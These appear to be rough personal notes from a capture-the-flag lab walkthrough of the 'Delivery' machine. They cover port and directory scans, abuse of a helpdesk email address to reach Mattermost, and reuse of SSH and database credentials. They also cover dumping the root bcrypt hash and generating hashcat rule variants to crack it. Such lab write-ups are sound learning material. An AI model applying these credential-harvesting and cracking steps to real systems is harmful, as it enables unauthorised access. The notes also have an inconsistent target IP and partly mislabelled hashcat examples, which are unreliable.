---
title: "hello"
date: 2023-06-03 00:00:00 +0800
categoriess: [Hello World]
tags: [Gello Gold]
---

## Hello World


---

I ran the below Nmap port scan.

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.194 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```
─$ nmap -p$ports -sC -sV 10.10.10.222
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-23 21:46 SAST
Nmap scan report for 10.10.10.222
Host is up (0.67s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


I opened the web application and got a page desscribing the site as a place to get email related ssupport. The below is found in the contact us area also

![[Pasted image 20251123215248.png]]

- Mattermost Server
- `@delivery` email needed to access the http://delivery.htb:8065
- unregistered users must use http://helpdesk.delivery.htb

The helpdesk site is using osTicket

```
└─$ whatweb http://helpdesk.delivery.htb
http://helpdesk.delivery.htb [200 OK] Bootstrap, Content-Language[en-US], Cookies[OSTSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], HttpOnly[OSTSESSID], IP[10.10.10.222], JQuery[3.5.1], PoweredBy[osTicket], Script[text/javascript], Title[delivery], UncommonHeaders[content-security-policy], X-UA-Compatible[IE=edge], nginx[1.14.2]
                                                            
```

![[Pasted image 20251123215913.png]]


Using Mattermost to create an account


```
tester@delivery.htb
Tester01
Tester@1234
```


![[Pasted image 20251123220219.png]]

I also create account on helpdesk. OsTicket system

![[Pasted image 20251123220325.png]]

```
tester@delivery.htb
Tester01
Tester@1234
```

![[Pasted image 20251123220707.png]]



Found the OSTSESSID cookie

```
┌──(kali㉿kali)-[~]
└─$ curl -I http://helpdesk.delivery.htb
HTTP/1.1 200 OK
Server: nginx/1.14.2
Date: Sun, 23 Nov 2025 20:05:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: OSTSESSID=fs3l7ct67m1k1pbrj352csc8l0; expires=Mon, 24-Nov-2025 20:05:16 GMT; Max-Age=86400; path=/; domain=helpdesk.delivery.htb; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Security-Policy: frame-ancestors 'self';
Content-Language: en-US

```


Ran a directory bruteforce on http://helpdesk.delivery.htb

```
└─$ gobuster dir -u http://helpdesk.delivery.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://helpdesk.delivery.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/api                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/api/]
/apps                 (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/apps/]
/assets               (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/assets/]
/css                  (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/css/]
/images               (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/images/]
/includes             (Status: 403) [Size: 169]
/include              (Status: 403) [Size: 169]
/index.php            (Status: 200) [Size: 4933]
/js                   (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/js/]
/kb                   (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/kb/]
/pages                (Status: 301) [Size: 185] [--> http://helpdesk.delivery.htb/pages/]
/web.config           (Status: 200) [Size: 2197]
Progress: 4746 / 4746 (100.00%)
===============================================================
Finished
===============================================================
                                                  
```


---

After creating a ticket i got the below message

![[Pasted image 20251128233522.png]]

3715024@delivery.htb



hackerman@delivery.htb-email Tester Hacker


5248072@delivery.htb
5248072



8199941@delivery.htb
Tester Hacker


![[Pasted image 20251129000533.png]]

Credentials to the server are maildeliverer:Youve_G0t_Mail!


```
─$ ssh maildeliverer@10.10.10.222
The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
ED25519 key fingerprint is SHA256:AGdhHnQ749stJakbrtXVi48e6KTkaMj/+QNYMW+tyj8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.222' (ED25519) to the list of known hosts.
maildeliverer@10.10.10.222's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5




f1b6b5e791aaf6fdb4ffdb6cca89c84e

```


---

```
maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep 'mmuser'
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
maildeliverer@Delivery:/opt/mattermost/config$ 

```

Logged in to local instance of MySQL

```
MariaDB [mattermost]> select Username,Password,Roles,Position from Users where Username='root';
+----------+--------------------------------------------------------------+--------------------------+----------+
| Username | Password                                                     | Roles                    | Position |
+----------+--------------------------------------------------------------+--------------------------+----------+
| root     | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO | system_admin system_user |  
```


## Command Explanation

The command `echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout` pipes the base password "PleaseSubscribe!" into hashcat, applying the `best64.rule` set (64 common transformations like capitalization, appending ! or digits, leet substitutions) and outputs variants to stdout [infinitelogins+1](https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/)​.

## Expected Output Preview

This generates ~64 variants per input word. Common examples from `best64.rule` include:

- PleaseSubscribe (lowercase)
    
- PleaseSubscribe! (original, no change)
    
- PleaseSubscribe1 (append 1)
    
- pPleaseSubscribe (prepend lowercase p)
    
- PLEASESUBSCRIBE (uppercase)
    
- PleaseSubscribe123 (append 123)
    
- Pl3aseSubscribe (3 for e substitution)
    
- PleaseSubscribe!! (double !).[trustedsec+2](https://trustedsec.com/blog/better-hacking-through-cracking-know-your-rules)​
    

## Usage Tips

Save output to file: `echo PleaseSubscribe! | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout > variants.txt` [infinitelogins](https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/)​.

Pipe multiple words: `echo -e "PleaseSubscribe!\npleasesubscribe!" | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout` for broader coverage.

Verify rule path exists (`ls /usr/share/hashcat/rules/best64.rule`); use relative `./rules/best64.rule` if in hashcat dir. Test with small rules first to preview.[hashcat+1](https://hashcat.net/forum/thread-8607.html)​

1. [https://hashcat.net/forum/thread-8607.html](https://hashcat.net/forum/thread-8607.html)
2. [https://hashcat.net/forum/post-45770.html](https://hashcat.net/forum/post-45770.html)
3. [https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/](https://infinitelogins.com/2020/11/16/using-hashcat-rules-to-create-custom-wordlists/)
4. [https://trustedsec.com/blog/better-hacking-through-cracking-know-your-rules](https://trustedsec.com/blog/better-hacking-through-cracking-know-your-rules)
5. [https://www.reddit.com/r/hacking/comments/vdplzf/best_rule_set_for_hashcat_in_2022/](https://www.reddit.com/r/hacking/comments/vdplzf/best_rule_set_for_hashcat_in_2022/)
6. [https://github.com/CarlosLannister/OwadeReborn/blob/master/owade/fileAnalyze/hashcatLib/best64.rule~](https://github.com/CarlosLannister/OwadeReborn/blob/master/owade/fileAnalyze/hashcatLib/best64.rule~)
7. [http://kaoticcreations.blogspot.com/2011/09/explanation-of-hashcat-rules.html](http://kaoticcreations.blogspot.com/2011/09/explanation-of-hashcat-rules.html)
8. [https://github.com/clem9669/hashcat-rule](https://github.com/clem9669/hashcat-rule)
9. [https://infinitelogins.com/tag/hashcat/](https://infinitelogins.com/tag/hashcat/)
10. [https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/](https://www.armourinfosec.com/performing-rule-based-attack-using-hashcat/)


----
root password
PleaseSubscribe!21
